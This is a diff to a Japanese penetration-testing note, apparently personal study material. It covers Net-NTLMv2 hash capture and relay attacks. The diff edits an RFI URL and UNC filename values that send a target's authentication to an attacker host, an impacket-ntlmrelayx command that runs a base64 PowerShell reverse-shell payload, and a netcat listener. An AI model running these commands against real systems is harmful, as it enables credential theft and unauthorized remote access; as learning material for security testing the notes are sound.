@@ -368,7 +368,7 @@ dir \\<AttackerIP>\hoge
 
 ・方法B : WebアプリでRFIの脆弱性を利用して、ターゲットから攻撃者上の存在しないSMB共有にアクセスさせる
 ```sh
-http://example/page=//<AttackerIP>/share/ho
+http://example/page=//<AttackerIP>/share/hoge
 ```
 
 - 方法C：Webアプリでファイルアップロードし、攻撃者上の存在しないSMB共有にアクセスさせる
@@ -397,9 +397,10 @@ $$filenameパラメタの値を攻撃者のIPを指すUNCパスに変更$$
 ### Net-NTLMv2リレーアタック手順
 
 1. PowerShellのリバースシェルワンライナーを用意する：[[What is the shell#Base64化したPowerShellリバースシェルワンライナー]]
+
 2. 攻撃者マシン上でntlmrelayxを起動
 ```zsh
-impacket-ntlmrelayx --no-http-server -smb2support -t $TargetIP -c "powershell -enc <base64 Encoded Payload>"
+impacket-ntlmrelayx --no-http-server -smb2support -t $TargetIP -c "powershell -enc <base64_encoded_payload>"
 ```
 - 🚨`$TargetIP`に設定するIPは、リレー先のもの（リレー元ではない）
 
@@ -409,19 +410,7 @@ sudo rlwrap nc -lvnp <port>
 ```
 
 4. ターゲット上から攻撃者のResponderにNet-NTLMv2認証をさせる
-- 方法A：ターゲットシェルを獲得(方法割愛)し、ターゲット上から攻撃者上の存在しないSMB共有にアクセスさせる
-```powershell
-dir \\<AttackerIP>\hoge
-```
-
-- 方法B：Webアプリケーションでファイルアップロードし、攻撃者上の存在しないSMB共有にアクセスさせる
-	- ⚠️ファイルアップロード機能が==SMBを介して可能である場合に==成功する
-	- Burp Suiteなどでfilenameパラメタを以下の値に変更してリクエストする
-```
-\\\\<AttackerIP>\hoge\hoge.txt
-```
-![[Pasted image 20250720111345.png]]
-$$filenameパラメタの値を攻撃者のIPを指すUNCパスに変更$$
+	- 方法は[[#Net-NTLMv2クラッキング手順 w/SMB]]のステップ2参照
 
 5. リバースシェル獲得！
 
